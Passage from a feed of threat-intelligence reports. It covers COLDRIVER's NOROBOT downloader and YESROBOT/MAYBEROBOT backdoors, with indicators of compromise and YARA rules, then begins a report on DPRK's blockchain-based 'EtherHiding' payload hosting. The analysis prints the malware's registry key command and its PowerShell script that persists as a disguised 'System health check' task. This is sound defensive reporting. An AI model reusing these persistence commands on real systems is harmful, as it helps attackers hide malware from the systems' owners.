style=\"vertical-align: baseline;\">NOROBOT, also disclosed as BAITSWITCH by Zscaler, is a DLL that has been observed undergoing regular development from May through September 2025. In all of the versions observed the main purpose of NOROBOT has been to retrieve the next stage from a hardcoded command and control (C2) address and prepare the system for the final payload. The earliest version of NOROBOT (</span><code style=\"vertical-align: baseline;\">2e74f6bd9bf73131d3213399ed2f669ec5f75392de69edf8ce8196cd70eb6aee</code><span style=\"vertical-align: baseline;\">) made use of cryptography in which the key was split across multiple components and needed to be recombined in a specific way in order to successfully decrypt the final payload. This was likely done to make it more difficult to reconstruct the infection chain because if one of the downloaded components was missing the final payload would not decrypt properly. Despite this attempt to hinder analysis, the earliest version of NOROBOT included fetching and extracting a full Python 3.8 installation, which is a noisy artifact that is likely to raise suspicions.</span></p>\n<p><span style=\"vertical-align: baseline;\">Details of the files retrieved by this version of NOROBOT are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">SFX RAR containing a Python 3.8 installation for Windows</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Command to store part of a crypto key in the registry</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Persistence via scheduled task</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Command to run bitsadmin to retrieve a file named libsystemhealthcheck.py</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Command to run bitsadmin to retrieve a file named libcryptopydatasize.py</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Both files retrieved using bitsadmin are from </span><code style=\"vertical-align: baseline;\">inspectguarantee[.]org</code><span style=\"vertical-align: baseline;\">:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">d7520e4f1c55ed1dcbdeba5c6e681e1d269d9b5a690636bf18bcdc5b294f3f8a</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">libsystemhealthcheck.py</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">52eb2b3df1e5e2a07ba4562b79eeb67679ac6f7f90190e72d3e6adcf5186401d</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">libcryptopydatasize.py</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The registry key command is:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\.pietas\" /v \"ratio\" /t REG_BINARY /d \"f5e210ec114e1992b81ff89be58cfb2778005f734972239b9655b23fcee5593f19554d0a74dad52c67956781367b06e6\" /f</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Persistence is done via a scheduled task:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>powershell -c \"\n$s = New-Object -ComObject Schedule.Service;\n$s.Connect();\n$t = $s.NewTask(0);\n$p = $t.principal;\n$p.logontype = 3;\n$p.RunLevel = 0;\n$a = $t.Actions.Create(0);\n$a.Path = \\\"$env:APPDATA\\Python38-64\\pythonw.exe\\\";\n$a.Arguments = \\\"$env:APPDATA\\Python38-64\\Lib\\libsystemhealthcheck.py\\\";\n$a.WorkingDirectory = \\\"$env:APPDATA\\Python38-64\\\";\n$tr = $t.Triggers.Create(9);\n$tr.userID = \\\"$env:computername\\\"+\\\"\\\\\\\"+\\\"$env:username\\\";\n$tr.enabled = $true;\n$s.GetFolder(\\\"\\\").RegisterTaskDefinition(\\\"System health check\\\", $t, 6, $null, $null, 0) | Out-Null;\n\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">libsystemhealthcheck.py contains part of an AES key that is combined with the key stored in the registry and decrypts libcryptopydatasize.py, which we have named YESROBOT.</span></p>\n<h3><span style=\"vertical-align: baseline;\">YESROBOT</span></h3>\n<p><span style=\"vertical-align: baseline;\">The decrypted version of YESROBOT is a Python backdoor which uses HTTPS to retrieve commands from a hardcoded C2. The commands are AES encrypted with a hardcoded key. System information and username are encoded in the User-Agent header of the request. YESROBOT is a minimal backdoor that requires all commands to be valid Python, which makes typical functionality, such as downloading and executing files or retrieving documents, more cumbersome to implement. A typical approach would include the retrieval and execution logic in the backdoor and only require the operator to send the URL. This makes YESROBOT difficult to extend and operate, and hints that the deployment of YESROBOT was a hastily made choice. GTIG observed only two instances of YESROBOT deployment over a two week period in late May before it was abandoned in favor of a different backdoor, MAYBEROBOT. It is for these reasons that GTIG assesses that YESROBOT was hastily deployed as a stopgap mechanism after our publication on LOSTKEYS.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Main loop of YESROBOT\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/coldriver-new-malware-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Main loop of YESROBOT, limited to Python command execution only</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">MAYBEROBOT</span></h3>\n<p><span style=\"vertical-align: baseline;\"> In early June 2025, GTIG observed a variant of NOROBOT (</span><code style=\"vertical-align: baseline;\">3b49904b68aedb6031318438ad2ff7be4bf9fd865339330495b177d5c4be69d1</code><span style=\"vertical-align: baseline;\">) which was drastically simplified from earlier versions. This version fetches a single file, which we observed to be a single command that sets up a logon script for persistence. The logon script was a Powershell command which downloaded and executed the next stage, which we call MAYBEROBOT, also known as SIMPLEFIX by Zscaler.</span></p>\n<p><span style=\"vertical-align: baseline;\">The file fetched by the logon script was a heavily obfuscated Powershell script (</span><code style=\"vertical-align: baseline;\">b60100729de2f468caf686638ad513fe28ce61590d2b0d8db85af9edc5da98f9</code><span style=\"vertical-align: baseline;\">) that uses a hardcoded C2 and a custom protocol that supports 3 commands:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Download and execute from a specified URL</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute the specified command using cmd.exe</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute the specified powershell block</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">In all cases an acknowledgement is sent to the C2 at a different path, while in the case of command 2 and 3, output is sent to a third path.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG assesses that MAYBEROBOT was developed to replace YESROBOT because it does not need a Python installation to execute, and because the protocol is extensible and allows attackers more flexibility when achieving objectives on target systems. While increased flexibility was certainly achieved, it is worth noting that MAYBEROBOT still has minimal built-in functionality and relies upon the operator to provide more complex commands like YESROBOT before it.</span></p>\n<h3><span style=\"vertical-align: baseline;\">The ROBOTs Continue to Evolve</span></h3>\n<p><span style=\"vertical-align: baseline;\">As GTIG continued to monitor and respond to COLDRIVER attempts to deliver NOROBOT to targets of interest from June through September 2025, we observed changes to both NOROBOT and the malware execution chain that indicate COLDRIVER was increasing their development tempo. GTIG has observed multiple versions of NOROBOT over time with varying degrees of simplicity. The specific changes made between NOROBOT variants highlight the group's persistent effort to evade detection systems while ensuring continued intelligence collection against high-value targets. However, by simplifying the NOROBOT downloader, COLDRIVER inadvertently made it easier for GTIG to track their activity. </span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG’s insight into the NOROBOT malware’s evolution aligned with our observation of their movement away from the older YESROBOT backdoor in favor of the newer MAYBEROBOT backdoor. GTIG assesses that COLDRIVER may have made changes to the final backdoor for several reasons: YESROBOT requiring a full Python interpreter to function is likely to increase detection in comparison to MAYBEROBOT, and YESROBOT backdoor was not easily extensible. </span></p>\n<p><span style=\"vertical-align: baseline;\">As MAYBEROBOT became the more commonly observed final backdoor in these operations, the NOROBOT infection chain to get there continued evolving. Over the course of this period of time, COLDRIVER simplified their malware infection chain and implemented basic evasion techniques, such as rotating infrastructure and file naming conventions, paths where files were retrieved from, how those paths were constructed, changing the export name and changing the DLL name. Along with making these minor changes, COLDRIVER re-introduced the need to collect crypto keys and intermediate downloader stages to be able to properly reconstruct the full infection chain. Adding complexity back in may increase operational security for the operation as it makes reconstructing their activity more difficult. Network defenders need to collect multiple files and crypto keys to reconstruct the full attack chain; whereas in the simplified NOROBOT chain they only need the URL from the logon script to retrieve the final payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG has observed multiple versions of NOROBOT indicating consistent development efforts, but the final backdoor of MAYBEROBOT has not changed. This indicates that COLDRIVER is interested in evading detection of their delivery mechanism while having high confidence that MAYBEROBOT is less likely to be detected.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Phishing or Malware?</span></h3>\n<p><span style=\"vertical-align: baseline;\">It is currently not known why COLDRIVER chooses to deploy malware over the more traditional phishing they are known for, but it is clear that they have spent significant development effort to re-tool and deploy their malware to specific targets. One hypothesis is that COLDRIVER attempts to deploy NOROBOT and MAYBEROBOT on significant targets which they may have previously compromised via phishing and already stolen emails and contacts from, and are now looking to acquire additional intelligence value from information on their devices directly.</span></p>\n<p><span style=\"vertical-align: baseline;\">As COLDRIVER continues to develop and deploy this chain we believe that they will continue their aggressive deployment against high-value targets to achieve their intelligence collection requirements.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Protecting the Community</span></h3>\n<p><span style=\"vertical-align: baseline;\">As part of our efforts to combat threat actors, we use the results of our research to improve the safety and security of Google’s products. Upon discovery, all identified malicious websites, domains and files are added to Safe Browsing to protect users from further exploitation. We also send targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encouraging potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.</span></p>\n<p><span style=\"vertical-align: baseline;\">We are committed to sharing our findings with the security community to raise awareness and with companies and individuals that might have been targeted by these activities. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.</span></p>\n<p><span style=\"vertical-align: baseline;\">Indicators of compromise (IOCs) and YARA rules are included in this post, and are also available as a GTI collection and rule pack.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following indicators of compromise are available in a <a href=\"https://www.virustotal.com/gui/collection/58341e00c39370af40104d9ca51e9fe33361afeca771f1aa433cc1c901e2f82e/iocs\" rel=\"noopener\" target=\"_blank\">Google Threat Intelligence (GTI) collection</a> for registered users.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">IOC</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Description</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">viewerdoconline[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">documentsec[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">documentsec[.]online</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">onstorageline[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">applicationformsubmit[.]me</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">oxwoocat[.]org</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">ned-granting-opportunities[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">blintepeeste[.]org</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">preentootmist[.]org</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">c4d0fba5aaafa40aef6836ed1414ae3eadc390e1969fdcb3b73c60fe7fb37897</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">COLDCOPY “ClickFix” lure</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">inspectguarantee[.]org</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT delivery domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">captchanom[.]top</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT delivery domain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">bce2a7165ceead4e3601e311c72743e0059ec2cd734ce7acf5cc9f7d8795ba0f</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">YESROBOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">system-healthadv[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">YESROBOT C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">85.239.52[.]32</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">YESROBOT C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2e74f6bd9bf73131d3213399ed2f669ec5f75392de69edf8ce8196cd70eb6aee</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT - iamnotarobot.dll - May 2025</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3b49904b68aedb6031318438ad2ff7be4bf9fd865339330495b177d5c4be69d1</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT - checkme.dll - June 2025</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">e9c8f6a7dba6e84a7226af89e988ae5e4364e2ff2973c72e14277c0f1462109b</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT - checkme.dll - June 2025</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">b60100729de2f468caf686638ad513fe28ce61590d2b0d8db85af9edc5da98f9</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Obfuscated MAYBEROBOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">southprovesolutions[.]com</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MAYBEROBOT C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">f2da013157c09aec9ceba1d4ac1472ed049833bc878a23bc82fe7eacbad399f4</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT - machinerie.dll - Re-introducing crypto and downloaders</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">87138f63974a8ccbbf5840c31165f1a4bf92a954bacccfbf1e7e5525d750aa48</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">NOROBOT - machinerie.dll - Latest sample from late August 2025</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_Downloader_NOROBOT_2 {\n  meta:\n    author = \"Google Threat Intelligence\"\n    description = \"DLL which pulls down and executes next stages\"\n  strings:\n    $path = \"/konfiguration12/\" wide\n    $file0 = \"arbeiter\" wide\n    $file1 = \"schlange\" wide\n    $file2 = \"gesundheitA\" wide\n    $file3 = \"gesundheitB\" wide\n\n    $new_file0 = \"/reglage/avec\" wide\n    $new_file1 = \"/erreur\" wide\n  condition:\n    filesize &lt;= 1MB and\n    (\n      $path or\n      all of ($file*) or\n      all of ($new_file*) or\n      (\n        for any s in (\"checkme.dll\", \"iamnotarobot.dll\", \"machinerie.dll\"): (pe.dll_name == s) and\n        for any s in (\"humanCheck\", \"verifyme\"): (pe.exports(s))\n      )\n    )\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_BACKDOOR_YESROBOT_1 {\n  meta:\n    author = \"Google Threat Intelligence Group (GTIG)\"\n  strings:\n    $s0 = \"return f'Mozilla/5.0 {base64.b64encode(str(get_machine_name()).encode()).decode()} {base64.b64encode(str(get_username()).encode()).decode()} {uuid} {get_windows_version()} {get_machine_locale()}'\"\n    $s1 = \"'User-Agent': obtainUA(),\"\n    $s2 = \"url = f\\\"https://{target}/connect\\\"\"\n    $s3 = \"print(f'{target} is not availible')\"\n    $s4 = \"tgtIp = check_targets(tgtList)\"\n    $s5 = \"cmd_url = f'https://{tgtIp}/command'\"\n    $s6 = \"print('There is no availible servers...')\"\n  condition:\n    4 of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_BACKDOOR_MAYBEROBOT_1 {\n  meta:\n    author = \"Google Threat Intelligence Group (GTIG)\"\n  strings:\n    $replace = \"-replace '\\\\n', ';' -replace '[^\\\\x20-\\\\x7E]', '' -replace '(?i)x[0-9A-Fa-f]{4}', '' -split \\\"\\\\n\\\"\"\n  condition:\n    all of them\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "DPRK Adopts EtherHiding: Nation-State Malware Hiding on Blockchains", "link": "https://cloud.google.com/blog/topics/threat-intelligence/dprk-adopts-etherhiding/", "published": "Thu, 16 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Blas Kojusner, Robert Wallace, Joseph Dobson</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) has observed the North Korea (DPRK) threat actor UNC5342 using ‘EtherHiding’ to deliver malware and facilitate cryptocurrency theft, the first time GTIG has observed a nation-state actor adopting this method. </span><span style=\"vertical-align: baseline;\">This post is part of a two-part blog series</span><span style=\"vertical-align: baseline;\"> on adversaries using EtherHiding</span><span style=\"vertical-align: baseline;\">, a technique that leverages transactions on public blockchains to store and retrieve malicious payloads—notable for its resilience against conventional takedown and blocklisting efforts. Read about <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware\">UNC5142 campaign leveraging EtherHiding to distribute malware</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">Since February 2025, GTIG has tracked UNC5342 incorporating EtherHiding into an ongoing social engineering campaign, dubbed Contagious Interview by Palo Alto Networks. In this campaign, the actor uses </span><span style=\"vertical-align: baseline;\">JADESNOW malware to deploy a JavaScript variant of </span>INVISIBLEFERRET,<span style=\"vertical-align: baseline;\"> which has led to numerous </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/examining-web3-heists\"><span style=\"text-decoration: underline; vertical-align: baseline;\">cryptocurrency heists</span></a>.</p>\n<h3><span style=\"vertical-align: baseline;\">How EtherHiding Works</span></h3>\n<p><span style=\"vertical-align: baseline;\">EtherHiding emerged in September 2023 as a key component in the financially motivated CLEARFAKE campaign (UNC5142), which uses deceptive overlays, like fake browser update prompts, to manipulate users into executing malicious code. </span></p>\n<p><span style=\"vertical-align: baseline;\">EtherHiding involves embedding malicious code, often in the form of JavaScript payloads, within a smart contract on a public blockchain like BNB Smart Chain or Ethereum. This approach essentially turns the blockchain into a decentralized and highly resilient command-and-control (C2) server</span><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">The typical attack chain unfolds as follows:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Initial Compromise:</strong><span style=\"vertical-align: baseline;\"> DPRK threat actors typically utilize social engineering for their initial compromise (e.g., fake job interviews, crypto games, etc.). Additionally, in the CLEARFAKE campaign, the attacker first gains access to a legitimate website, commonly a WordPress site, through vulnerabilities or stolen credentials.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Injection of a Loader Script:</strong><span style=\"vertical-align: baseline;\"> The attacker injects a small piece of JavaScript code, often referred to as a \"loader,\" into the compromised website.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fetching the Malicious Payload:</strong><span style=\"vertical-align: baseline;\"> When a user visits the compromised website, the loader script executes in their browser. This script then communicates with the blockchain to retrieve the main malicious payload stored in a remote server. A key aspect of this step is the use of a read-only function call (such as </span><code style=\"vertical-align: baseline;\">eth_call</code><span style=\"vertical-align: baseline;\">), which does not create a transaction on the blockchain. This ensures the retrieval of the malware is stealthy and avoids transaction fees (i.e. gas fees).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Payload Execution:</strong><span style=\"vertical-align: baseline;\"> Once fetched, the malicious payload is executed on the victim's computer. This can lead to various malicious activities, such as displaying fake login pages, installing information-stealing malware, or deploying ransomware.</span></p>\n</li>\n</ol>\n<h3><span style=\"vertical-align: baseline;\">Advantages for Attackers</span></h3>\n<p><span style=\"vertical-align: baseline;\">EtherHiding offers several significant advantages to attackers, positioning it as a particularly challenging threat to mitigate:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Decentralization and Resilience:</strong><span style=\"vertical-align: baseline;\"> Because malicious code is stored on a decentralized and permissionless blockchain, there is no central server that law enforcement or cybersecurity firms can take down. The malicious code remains accessible as long as the blockchain itself is operational.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Anonymity:</strong><span style=\"vertical-align: baseline;\"> The pseudonymous nature of blockchain transactions makes it difficult to trace the identity of the attackers who deployed the smart contract.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Immutability:</strong><span style=\"vertical-align: baseline;\"> Once a smart contract is deployed, the malicious code within it typically cannot be easily removed or altered by anyone other than the contract owner. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stealth:</strong><span style=\"vertical-align: baseline;\"> Attackers can retrieve the malicious payload using read-only calls that do not leave a visible transaction history on the blockchain, making their activities harder to track.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Flexibility:</strong><span style=\"vertical-align: baseline;\"> The attacker who controls the smart contract can update the malicious payload at any time. This allows them to change their attack methods, update domains, or deploy different types of malware to compromised websites simultaneously by simply updating the smart contract.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In essence, EtherHiding represents a shift toward next-generation bulletproof hosting, where the inherent features of blockchain technology are repurposed for malicious ends. This technique underscores the continuous evolution of cyber threats as attackers adapt and leverage new technologies to their advantage.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">DPRK Social Engineering Campaign</span></h3>\n<p><span style=\"vertical-align: baseline;\">North Korea's social engineering campaign is a sophisticated and ongoing cyber espionage and financially motivated operation that cleverly exploits the job application and interview process. This campaign targets developers, particularly in the cryptocurrency and technology sectors, to steal sensitive data, cryptocurrency, and gain persistent access to corporate networks.</span></p>\n<p><span style=\"vertical-align: baseline;\">The campaign has a dual purpose that aligns with North Korea's strategic goals:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Financial Gain:</strong><span style=\"vertical-align: baseline;\"> A primary objective is the theft of cryptocurrency and other financial assets to generate revenue for the regime, helping it bypass international sanctions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Espionage:</strong><span style=\"vertical-align: baseline;\"> By compromising developers, the campaign aims to gather valuable intelligence and 